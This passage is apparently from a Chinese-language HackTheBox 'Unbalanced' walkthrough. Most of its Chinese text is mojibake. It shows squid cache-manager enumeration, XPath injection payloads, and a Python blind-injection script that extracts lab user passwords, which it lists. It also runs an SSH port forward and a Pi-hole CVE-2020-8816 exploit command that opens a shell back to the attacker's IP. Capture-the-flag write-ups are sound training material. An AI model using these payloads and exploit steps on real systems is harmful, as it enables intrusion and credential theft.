<code>Thah$Sh1</code></li><li>åªèƒ½æœ¬åœ°è®¿é—®</li></ul><p>é‚£å°±å¾ˆæ˜æ˜¾äº†ã€‚æˆ‘ä»¬ä¹‹å‰nampä¹Ÿæ²¡æœ‰æ‰¾åˆ°squidä»¥å¤–çš„webæœåŠ¡ã€‚æ—¢ç„¶å¦‚æ­¤,ç›´æ¥ä½¿ç”¨å®ƒè¿™ä¸ªä»£ç†æœåŠ¡å™¨ä½œä»£ç†å°±èƒ½è®¿é—®å†…ç½‘ç½‘é¡µäº†ã€‚</p><p>ä¿®æ”¹æµè§ˆå™¨çš„ä»£ç†æ”¹ä¸º<code>10.10.10.200:3128</code>.å†æ¬¡è®¿é—®<code>intranet.unbalanced.htb</code></p><p><img src="/2020/08/15/hackthebox-Unbalanced/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°é¡µé¢.å®ƒä¼šé‡å®šå‘æˆ‘ä»¬åˆ°<code>/inranet.php</code>ã€‚ä¸è¿‡è¿™ä¸ªç™»å½•ç•Œé¢æ²¡å•¥ä¸œè¥¿ã€‚å¯èƒ½éœ€è¦è¿›ä¸€æ­¥åˆ©ç”¨ã€‚å”¯ä¸€ç¨å¾®æ³„éœ²å‡ºç›¸å…³ä¿¡æ¯çš„å†…å®¹åœ¨headersé‡Œ</p><p><img src="/2020/08/15/hackthebox-Unbalanced/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ—¶æƒ³èµ·æˆ‘ä»¬ä¹‹å‰çš„cache managerå¯†ç ã€‚æœç´¢ä¸€æ³¢å¦‚ä½•åˆ©ç”¨ã€‚</p><blockquote><p>The cache manager (cachemgr.cgi) is a CGI utility for displaying statistics about the squid process as it runs</p></blockquote><p>ç®€å•çœ‹ä¸‹å‘ç°æˆ‘ä»¬æ˜¯å¯ä»¥è°ƒç”¨cachemgrçš„å‘½ä»¤çš„ã€‚ä¹‹å‰åœ¨squid.confä¸­è·Ÿåœ¨å¯†ç åçš„ä¸€å¤§ç»„æ–‡å­—å…¶å®å°±æ˜¯å„ç§å¯è°ƒç”¨çš„å‘½ä»¤ã€‚<br>æœç´¢äº†ä¸‹è°ƒç”¨æ–¹å¼ã€‚å‘ç°å¯ä»¥<code>telnet</code>è¿æ¥ä»£ç†æœåŠ¡å™¨ç„¶åå†ä¼ ä¸€ä¸ªhttpæŠ¥å¤´ã€‚ä¸è¿‡åæ¥æ‰¾åˆ°ä¸€ä¸ªdebianå°±æœ‰çš„<code>squidclient</code>å‘½ä»¤è¡Œ.æ›´åŠ æ–¹ä¾¿ã€‚<br>æˆ‘ä»¬å…ˆè°ƒç”¨ä¸‹<code>menu</code>å‘½ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> root@byc404:~/htb/boxes/Unbalanced<span class="comment">#   squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu                                                                                                      </span></span><br><span class="line">HTTP/1.1 200 OK                                                                               </span><br><span class="line">Server: squid/4.6                                                                             </span><br><span class="line">Mime-Version: 1.0                                                                             </span><br><span class="line">Date: Sat, 15 Aug 2020 02:17:42 GMT                                                           </span><br><span class="line">Content-Type: text/plain;charset=utf-8                                                        </span><br><span class="line">Expires: Sat, 15 Aug 2020 02:17:42 GMT                                                        </span><br><span class="line">Last-Modified: Sat, 15 Aug 2020 02:17:42 GMT                                                  </span><br><span class="line">X-Cache: MISS from unbalanced                                                                 </span><br><span class="line">X-Cache-Lookup: MISS from unbalanced:3128                                                     </span><br><span class="line">Via: 1.1 unbalanced (squid/4.6)                                                               </span><br><span class="line">Connection: close                                                                             </span><br><span class="line">                                                                                              </span><br><span class="line"> index                  Cache Manager Interface                 disabled</span><br><span class="line"> menu                   Cache Manager Menu                      protected</span><br><span class="line"> offline_toggle         Toggle offline_mode setting             disabled</span><br><span class="line"> shutdown               Shut Down the Squid Process             disabled</span><br><span class="line"> reconfigure            Reconfigure Squid                       disabled</span><br><span class="line"> rotate                 Rotate Squid Logs                       disabled</span><br><span class="line"> pconn                  Persistent Connection Utilization Histograms    protected</span><br><span class="line"> mem                    Memory Utilization                      protected</span><br><span class="line"> diskd                  DISKD Stats                             protected</span><br><span class="line"> squidaio_counts        Async IO Function Counters              disabled</span><br><span class="line"> config                 Current Squid Configuration             disabled </span><br><span class="line"> client_list            Cache Client List                       disabled </span><br><span class="line"> comm_epoll_incoming    comm_incoming() stats                   disabled </span><br><span class="line"> ipcache                IP Cache Stats and Contents             disabled</span><br><span class="line"> fqdncache              FQDN Cache Stats and Contents           protected</span><br><span class="line"> idns                   Internal DNS Statistics                 disabled</span><br><span class="line"> redirector             URL Redirector Stats                    disabled</span><br><span class="line"> store_id               StoreId helper Stats                    disabled</span><br><span class="line"> external_acl           External ACL stats                      disabled</span><br><span class="line"> http_headers           HTTP Header Statistics                  disabled      </span><br><span class="line"> external_acl           External ACL stats                      disabled</span><br><span class="line"> http_headers           HTTP Header Statistics                  disabled                      </span><br><span class="line"> info                   General Runtime Information             disabled                      </span><br><span class="line"> service_times          Service Times (Percentiles)             disabled                                                                </span><br><span class="line"> filedescriptors        Process Filedescriptor Allocation       protected                     </span><br><span class="line"> objects                All Cache Objects                       protected                     </span><br><span class="line"> vm_objects             In-Memory and In-Transit Objects        protected                     </span><br><span class="line"> io                     Server-side network <span class="built_in">read</span>() size histograms      disabled              </span><br><span class="line"> counters               Traffic and Resource Counters           protected                     </span><br><span class="line"> peer_select            Peer Selection Algorithms               disabled                      </span><br><span class="line"> digest_stats           Cache Digest and ICP blob               disabled                      </span><br><span class="line"> 5min                   5 Minute Average of Counters            protected                     </span><br><span class="line"> 60min                  60 Minute Average of Counters           protected                     </span><br><span class="line"> utilization            Cache Utilization                       disabled                      </span><br><span class="line"> histograms             Full Histogram Counts                   protected                     </span><br><span class="line"> active_requests        Client-side Active Requests             disabled                      </span><br><span class="line"> username_cache         Active Cached Usernames                 disabled</span><br><span class="line"> openfd_objects         Objects with Swapout files open         disabled </span><br><span class="line"> store_digest           Store Digest                            disabled</span><br><span class="line"> store_log_tags         Histogram of store.log tags             disabled</span><br><span class="line"> storedir               Store Directory Stats                   disabled</span><br><span class="line"> store_io               Store IO Interface Stats                disabled</span><br><span class="line"> store_check_cachable_stats     storeCheckCachable() Stats              disabled </span><br><span class="line"> refresh                Refresh Algorithm Statistics            disabled </span><br><span class="line"> delay                  Delay Pool Levels                       disabled </span><br><span class="line"> forward                Request Forwarding Statistics           disabled</span><br><span class="line"> cbdata                 Callback Data Registry Contents         protected</span><br><span class="line"> sbuf                   String-Buffer statistics                protected</span><br><span class="line"> events                 Event Queue                             protected</span><br><span class="line"> netdb                  Network Measurement Database            disabled</span><br><span class="line"> asndb                  AS Number Database                      disabled </span><br><span class="line"> carp                   CARP information                        disabled</span><br><span class="line"> userhash               peer userhash information               disabled</span><br><span class="line"> sourcehash             peer sourcehash information             disabled</span><br><span class="line"> server_list            Peer Cache Statistics                   disabled</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é™¤äº†squidé…ç½®ä¸­å·²ç»æ ‡å‡ºçš„å¯ç”¨å‘½ä»¤å¤–,å…¶ä»–éƒ½æ˜¯disabledçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¾æ¬¡è°ƒç”¨ä¸‹å¯»æ‰¾å…³é”®ä¿¡æ¯ã€‚<br>åœ¨è°ƒç”¨åˆ°<code>fqdncache</code>æ—¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FQDN Cache Statistics:</span><br><span class="line">FQDNcache Entries In Use: 13</span><br><span class="line">FQDNcache Entries Cached: 11</span><br><span class="line">FQDNcache Requests: 12782</span><br><span class="line">FQDNcache Hits: 0</span><br><span class="line">FQDNcache Negative Hits: 7080</span><br><span class="line">FQDNcache Misses: 5702</span><br><span class="line">FQDN Cache Contents:</span><br><span class="line"></span><br><span class="line">Address                                       Flg TTL Cnt Hostnames</span><br><span class="line">10.10.14.6                                     N  -16959   0</span><br><span class="line">127.0.1.1                                       H -001   2 unbalanced.htb unbalanced</span><br><span class="line">::1                                             H -001   3 localhost ip6-localhost ip6-loopback</span><br><span class="line">172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb</span><br><span class="line">172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb</span><br><span class="line">10.10.10.200                                   N  -1086   0</span><br><span class="line">127.0.0.1                                       H -001   1 localhost</span><br><span class="line">172.17.0.1                                      H -001   1 intranet.unbalanced.htb</span><br><span class="line">ff02::1                                         H -001   1 ip6-allnodes</span><br><span class="line">ff02::2                                         H -001   1 ip6-allrouters</span><br><span class="line">10.10.14.65                                    N  025   0</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>intranet-host3.unbalanced.htb</code>åŠå¯¹åº”çš„ipã€‚ä¸éš¾æƒ³åˆ°å†…ç½‘é‡Œå¯èƒ½è¿˜æœ‰å…¶ä»–æœåŠ¡ã€‚è¿™é‡Œå…ˆè®¿é—®<code>172.31.179.2</code>ä¸<code>172.31.179.3</code>.å‘ç°ä¼šè¢«é‡å®šå‘åˆ°<code>/inranet.php</code>ä¹Ÿå°±æ˜¯è·Ÿä¹‹å‰åŒæ ·çš„ç½‘é¡µã€‚ä½†æ˜¯é¡ºç€è®¿é—®<code>172.31.179.1</code>æ—¶<br><img src="/2020/08/15/hackthebox-Unbalanced/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ²¡æœ‰å‡ºç°é‡å®šå‘ã€‚è¿™ç§æ€ªå¼‚è¡Œä¸ºå€¼å¾—é‡è§†ã€‚æˆ‘ä»¬å†æ¬¡è®¿é—®<code>172.31.179.1/intranet.php</code>ã€‚è¿™æ¬¡å°è¯•ç™»å½•æ—¶,ä¼šå‘ç°å®ƒä¼šå›æ˜¾<code>Invalid credentials.</code>.ä¹Ÿå°±æ˜¯è¯´å¯ä»¥è·ŸæœåŠ¡äº¤äº’äº†ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤è‚¯å®šå°±è¦åœ¨ç™»å½•å‚æ•°ä½œæ–‡ç« ã€‚æ— éä¸å°±æ˜¯sqlié‚£ä¸€å¥—ã€‚ç®€å•å°è¯•åå‘ç°å¯†ç å¤„å­˜åœ¨æ³¨å…¥.å½“ä»¥<code>abc&#39; or &#39;1&#39;=&#39;1</code>ä½œä¸ºå¯†ç æ—¶ä¼šå›æ˜¾å››ä¸ªç”¨æˆ·åä¸å¯¹åº”é‚®ç®±ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> rita</span><br><span class="line">Rita Fubelli</span><br><span class="line"></span><br><span class="line">rita@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: HR Manager</span><br><span class="line"></span><br><span class="line">jim</span><br><span class="line">Jim Mickelson</span><br><span class="line"></span><br><span class="line">jim@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: Web Designer</span><br><span class="line"></span><br><span class="line">bryan</span><br><span class="line">Bryan Angstrom</span><br><span class="line"></span><br><span class="line">bryan@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: System Administrator</span><br><span class="line"></span><br><span class="line">sarah</span><br><span class="line">Sarah Goodman</span><br><span class="line"></span><br><span class="line">sarah@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: Team Leader</span><br></pre></td></tr></table></figure><p>bryanæ˜¯<code>Administrator</code>.è¯´æ˜å¾ˆæœ‰å¯èƒ½å°±æ˜¯éœ€è¦ä»–çš„ä¿¡æ¯ã€‚ä¸è¿‡è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ä¸Šéœ€è¦æ³¨æ„ä¸‹ã€‚å½“æˆ‘å°è¯•å¦‚<code>abc&#39; or 1=1#</code>è¿™æ ·çš„payloadä¸å¯è¡Œ,<code>abc&#39; or substr(&#39;abc&#39;,1,1)=&#39;a</code>ä¹Ÿä¸å¯è¡Œã€‚ä½†æ˜¯<code>abc&#39; or substring(&#39;abc&#39;,1,1)=&#39;a</code>æ˜¯å›æ˜¾äº†çœŸå€¼çš„ã€‚é‚£ä¹ˆè¿™é‡ŒçœŸçš„æ˜¯sqlæ³¨å…¥å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚æˆ‘å¾ˆå¿«è”æƒ³åˆ°æ›¾ç»åœ¨npuctfä¸­å‡ºç°è¿‡ä¸€æ¬¡çš„xpathæ³¨å…¥ã€‚åŠ ä¸Šè¿™é‡Œå¹¶æ²¡æœ‰æ‰§è¡Œæ‰€è°“çš„ç™»å½•æ“ä½œï¼Œè€Œæ˜¯åœ¨ç•Œé¢å›æ˜¾htmlå—å†…å®¹ã€‚æˆ‘å¯ä»¥åˆ¤æ–­,è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªxpathæ³¨å…¥è€Œä¸æ˜¯sqlæ³¨å…¥ã€‚</p><p>xpathæ¥ç›²æ³¨çš„è¯ã€‚æ¯”èµ·sqlå¸ƒå°”ç›²æ³¨æ›´åŠ ç®€å•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://172.31.179.1/intranet.php'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">"10.10.10.200:3128"</span>&#125;</span><br><span class="line">users=&#123;<span class="string">'bryan'</span>,<span class="string">'rita'</span>,<span class="string">'jim'</span>,<span class="string">'sarah'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">    password=<span class="string">""</span></span><br><span class="line">    print(user)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            data=&#123;<span class="string">"Username"</span>:<span class="string">"a"</span>,<span class="string">"Password"</span>:<span class="string">"' or Username='"</span>+user+<span class="string">"' and substring(Password,"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">""</span>&#125;</span><br><span class="line">            r=requests.post(URL,data=data,proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> len(r.text) &gt; <span class="number">7000</span>:</span><br><span class="line">                password+=j</span><br><span class="line">                a=<span class="number">1</span></span><br><span class="line">                print(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç®€å•å†™ä¸ªç›²æ³¨è„šæœ¬,æ³¨æ„è¦æŒ‚å®ƒçš„proxyã€‚è¿™é‡Œä¼˜å…ˆè·‘bryançš„å¯†ç ã€‚å› ä¸ºè¿œç¨‹å®åœ¨å¤ªæ…¢äº†â€¦â€¦å¹¸å¥½bryanå°±æ˜¯ç³»ç»Ÿç”¨æˆ·ã€‚ä½¿ç”¨å®ƒçš„å¯†ç å³å¯sshç™»å½•ã€‚</p><p>å…¶ä»–äººçš„å¯†ç åæ¥èŠ±äº›æ—¶é—´ä¹Ÿè·‘å‡ºæ¥äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bryan:ireallyl0vebubblegum!!!</span><br><span class="line">rita:password01!</span><br><span class="line">jim:stairwaytoheaven</span><br><span class="line">sarah:sarah4evah</span><br></pre></td></tr></table></figure><p>bryanç™»å½•ä¸Šå»å°±èƒ½æ‹¿åˆ°user.txtäº†ã€‚</p><p>ç®€å•è¯´è¿™ä¸€éƒ¨åˆ†å…¶å®éš¾åº¦çœŸçš„ä¸€èˆ¬ã€‚ä¸»è¦æ˜¯ä½¿ç”¨å®ƒç»™çš„proxyè¿™æ­¥å¯èƒ½æœ‰çš„äººæ²¡åšè¿‡ã€‚ä½†æ˜¯å‡å¦‚åˆ©ç”¨å¥½rsyncå¾—åˆ°çš„confå°±èƒ½å¾ˆå¿«çŸ¥é“è¿™ç‚¹ã€‚æ‰€ä»¥éš¾åº¦ä¸€èˆ¬ã€‚åé¢æ¯”è¾ƒè¿·æƒ‘çš„è¿˜æ˜¯xpathä¸sqliä¸èƒ½æ··æ·†ã€‚ä¸è¿‡é€šè¿‡ç®€å•çš„fuzzè¿˜æ˜¯èƒ½åˆ¤æ–­å‡ºæ¥çš„ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>bryanæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªTODO</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Intranet #</span><br><span class="line">############</span><br><span class="line">* Install new intranet-host3 docker [DONE]</span><br><span class="line">* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]</span><br><span class="line">* Test intranet-host3 [DONE]</span><br><span class="line">* Add intranet-host3 to load balancer [DONE]</span><br><span class="line">* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]</span><br><span class="line">* Fix intranet-host2 [DONE]</span><br><span class="line">* Re-add intranet-host2 to load balancer (set default weight) [DONE]</span><br><span class="line">- Fix intranet-host1 [TODO]</span><br><span class="line">- Re-add intranet-host1 to load balancer (set default weight) [TODO]</span><br><span class="line"></span><br><span class="line">###########</span><br><span class="line"># Pi-hole #</span><br><span class="line">###########</span><br><span class="line">* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]</span><br><span class="line">* Set temporary admin password [DONE]</span><br><span class="line">* Create Pi-hole configuration script [IN PROGRESS]</span><br><span class="line">- Run Pi-hole configuration script [TODO]</span><br><span class="line">- Expose Pi-hole ports to the network [TODO]</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºã€‚é¶æœºä¸Šå·²ç»è·‘å¥½äº†ä¸€ä¸ªdockerã€‚ä½†æ˜¯å®ƒæ˜¯è·‘åœ¨127ã€‚0.0.1çš„ã€‚å¹¶ä¸”æœ‰ä¸ª<code>admin</code>å¯†ç ã€‚Pi-hole é…ç½®æ–‡ä»¶å°šæœªå®Œæˆã€‚</p><p><code>ss -lntp</code>çœ‹ä¸‹ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bryan@unbalanced:~$ ss -lntp</span><br><span class="line">State                    Recv-Q                   Send-Q                                       Local Address:Port                                       Peer Address:Port                   </span><br><span class="line">LISTEN                   0                        5                                                  0.0.0.0:873                                             0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        128                                              127.0.0.1:8080                                            0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        128                                              127.0.0.1:5553                                            0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        32                                                 0.0.0.0:53                                              0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        128                                                0.0.0.0:22                                              0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        5                                                     [::]:873                                                [::]:*                      </span><br><span class="line">LISTEN                   0                        32                                                    [::]:53                                                 [::]:*                      </span><br><span class="line">LISTEN                   0                        128                                                   [::]:22                                                 [::]:*                      </span><br><span class="line">LISTEN                   0                        128                                                      *:3128                                                  *:*</span><br></pre></td></tr></table></figure><p>8080ä¸5553æ˜æ˜¾æ˜¯è·‘åœ¨æœ¬åœ°ä¸Šçš„ã€‚å…¶ä¸­8080å¯ä»¥curlåˆ°ã€‚ä¸è¿‡ä¼šæé†’æˆ‘ä»¬hostnameä¸å¯¹ã€‚</p><p>æ—¢ç„¶æ˜¯ä¸ªwebæœåŠ¡ã€‚é‚£å…ˆç«¯å£è½¬å‘åˆ°æœ¬åœ°çœ‹çœ‹é•¿ä»€ä¹ˆæ ·ã€‚æˆ‘ä»¬ç›´æ¥ç”¨sshè½¬å‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~C <span class="comment">#è¿›å…¥sshå‘½ä»¤è¡Œ</span></span><br><span class="line">-L 8080:127.0.0.1:8080</span><br></pre></td></tr></table></figure><p>å¢åŠ ä¸€ä¸ª<code>Host: unbalanced</code><br><img src="/2020/08/15/hackthebox-Unbalanced/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å†æ¬¡æš´éœ²äº†ä¸€ä¸ª<code>pihole.unbalanced.htb</code>.ä»¥åŠå¯¹åº”çš„å†…ç½‘ip.</p><p>è®¿é—®è¿™ä¸ªpiholeçš„åå°<code>/admin</code>.å› ä¸ºä¹‹å‰æç¤ºè¿‡æˆ‘ä»¬temporary admin password .æ‰€ä»¥ç”¨adminå°±èƒ½ç™»å…¥ã€‚è¿›å»åå‘ç°æ˜¯ä¸ª4.3.2ç‰ˆæœ¬çš„pihole.</p><p><img src="/2020/08/15/hackthebox-Unbalanced/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æš‚æ—¶æ²¡æ€è·¯ã€‚ä¸è¿‡æœç´¢ä¸‹å‘ç°ç‰ˆæœ¬åœ¨CVE-2020-8816å¯ç”¨èŒƒå›´å†…ã€‚è¿™ä¸ªæ˜¯å¯ä»¥ç›´æ¥rceæ‹¿åˆ°www-dataçš„shellçš„ã€‚è™½ç„¶è·Ÿæˆ‘ä»¬ææƒrootæ²¡å•¥å…³ç³»ã€‚ä½†æ˜¯ä¸å¦¨ä¸€è¯•ã€‚<br>ç”¨è¿™çš„exp<br><a href="https://github.com/AndreyRainchik/CVE-2020-8816" target="_blank" rel="noopener">https://github.com/AndreyRainchik/CVE-2020-8816</a></p><p>å› ä¸ºæˆ‘ä»¬å·²ç»è½¬å‘å¥½ç«¯å£äº†ã€‚æ‰€ä»¥ç›´æ¥æ‰“å°±æ˜¯äº†<br><code>python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001</code><br><img src="/2020/08/15/hackthebox-Unbalanced/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/08/15/hackthebox-Unbalanced/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>www-dataçš„è¯è‚¯å®šå¾—ç»§ç»­æ”¶é›†ä¿¡æ¯äº†ã€‚ä½†æ˜¯æˆ‘æ„æƒ³ä¸åˆ°çš„æ˜¯www-dataå±…ç„¶å¯ä»¥ç›´æ¥è¿›è¿™ä¸ªdockerçš„rootç›®å½•â€¦â€¦ç®€ç›´å¯æ€•ã€‚ç„¶åé‡Œé¢æœ‰ä¹‹å‰æåˆ°çš„configæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 